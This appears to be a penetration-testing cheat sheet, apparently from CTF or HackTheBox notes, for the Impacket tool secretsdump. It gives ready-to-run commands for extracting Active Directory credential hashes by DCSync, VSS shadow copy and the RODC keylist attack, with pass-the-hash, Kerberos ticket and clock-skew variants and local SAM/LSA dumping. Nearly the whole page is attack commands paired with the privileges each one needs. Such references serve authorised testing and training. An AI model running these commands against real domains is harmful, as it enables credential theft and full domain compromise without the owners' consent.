title: secretsdump
html:
secretsdump

> Extract credentials from AD via DCSync, VSS shadow copy, or RODC keylist. The go-to for hash extraction.

DCSync (DRSUAPI)

When: Account has DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (Domain Admins, DC$).

# Single user
secretsdump.py 'domain/user:pass@DC' -just-dc-user Administrator

# All users
secretsdump.py 'domain/user:pass@DC' -just-dc

# NTLM only (faster)
secretsdump.py 'domain/user:pass@DC' -just-dc-ntlm

# With output file
secretsdump.py 'domain/user:pass@DC' -just-dc -outputfile dump

VSS Shadow Copy

When: Local admin on DC but no DCSync rights.

secretsdump.py 'domain/user:pass@DC' -use-vss

# Specific exec method
secretsdump.py 'domain/user:pass@DC' -use-vss -exec-method wmiexec

RODC KeyList Attack

When: Have RODC krbtgt AES key + RODC$ creds.

secretsdump.py 'domain/RODC01$:pass@DC' -rodcNo 8245 -rodcKey AES256_KEY -use-keylist -just-dc-user Administrator

Authentication

# Password
secretsdump.py 'domain/user:pass@target'

# Pass-the-Hash
secretsdump.py -hashes :NTHASH 'domain/user@target'

# Kerberos
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass 'domain/user@target.domain.htb'

# Clock skew
faketime '+8 hours' secretsdump.py ...

Local SAM/LSA (non-DC targets)

# Dumps SAM + LSA secrets + cached domain creds
secretsdump.py 'domain/user:pass@target'
